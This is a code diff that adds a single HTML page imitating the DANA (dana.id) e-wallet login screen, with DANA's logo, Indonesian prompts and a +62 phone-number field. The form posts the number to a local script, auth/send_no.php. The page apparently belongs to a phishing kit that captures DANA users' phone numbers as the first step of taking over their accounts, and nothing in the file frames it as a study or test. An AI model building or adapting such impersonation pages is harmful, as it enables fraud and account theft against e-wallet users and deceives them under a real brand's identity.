@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   DANA | dana.id
+  </title>
+  <link href="./assets/img/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+  <link href="./assets/img/favicon/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+  <link href="./assets/img/favicon/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+  <link href="./assets/img/favicon/site.webmanifest" rel="manifest"/>
+  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+  <meta http-equiv="refresh"/>
+  <link href="./lib/style/main.css" rel="stylesheet" type="text/css"/>
+  <link href="./lib/style/spinner.css" rel="stylesheet" type="text/css"/>
+ </head>
+ <body>
+  <div class="container">
+   <a class="aback" href="/">
+    <img class="back" src="./assets/img/back.png"/>
+   </a>
+   <img class="dana_logo" src="./assets/img/dana_logo.png"/>
+   <h1 class="page-login">
+    Masukkan
+    <b class="bh1">
+     nomor HP
+    </b>
+    kamu untuk lanjut
+   </h1>
+   <div class="inputNo">
+    <form action="./auth/send_no.php" class="formNo" method="post">
+     <label class="flagNo" for="nope">
+      <img class="flagIndo" src="./assets/img/indo.png"/>
+     </label>
+     <label for="nope">
+      <p class="codeTel">
+       +62
+      </p>
+     </label>
+     <input autocomplete="off" class="nope" id="nope" maxlength="16" name="phoneNumber" placeholder="811-1234-5678" required="" type="tel"/>
+     <h1 class="syarat">
+      Dengan melanjutkan, kamu setuju dengan
+      <b class="bh1">
+       Syarat &amp; Ketentuan
+      </b>
+      dan
+      <b class="bh1">
+       Kebijakan Privasi
+      </b>
+      kami
+     </h1>
+     <center>
+      <button class="send_data" disabled="" id="send_data">
+       LANJUT
+      </button>
+     </center>
+    </form>
+   </div>
+  </div>
+  <div class="process" id="process" name="process" style="display: none;">
+   <div class="loading">
+    <img src="./assets/img/load_bg.png"/>
+    <img class="spinner" src="./assets/img/load_spin.png"/>
+   </div>
+  </div>
+  <script src="./lib/functions/jquery.min.js">
+  </script>
+  <script src="./lib/functions/jquery.mask.min.js">
+  </script>
+  <script src="./lib/functions/function.js">
+  </script>
+ </body>
+</html>
